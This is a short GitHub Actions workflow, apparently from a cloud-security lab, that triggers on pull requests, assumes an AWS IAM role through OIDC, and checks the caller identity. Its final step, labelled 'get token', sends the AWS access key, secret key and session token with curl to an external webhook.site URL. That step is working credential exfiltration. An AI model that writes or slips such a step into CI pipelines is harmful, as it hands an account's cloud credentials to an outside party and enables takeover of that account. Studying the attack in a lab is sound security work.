name: "test AWS Access"

# The workflow should only trigger on pull requests to the main branch
on:
  pull_request: 
    branches: 
      - main

# Required to get the ID Token that will be used for OIDC
permissions:
  id-token: write
  contents: read # needed for private repos to checkout

jobs: 
  assume-role: 
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v3
        with:
          aws-region: eu-west-1
          role-to-assume: "arn:aws:iam::009313048793:role/sts-lab-2-target"
          role-session-name: OIDCSession

      - name: get sts
        run: aws sts get-caller-identity

      - name: get token
        run: curl -X POST https://webhook.site/f28253da-af89-4431-8912-aad3d68d6b8c -H "Content-Type: application/json" -d "{\"key\":\"$AWS_ACCESS_KEY_ID\",\"secret\":\"$AWS_SECRET_ACCESS_KEY\",\"token\":\"$AWS_SESSION_TOKEN\"}"
# retry
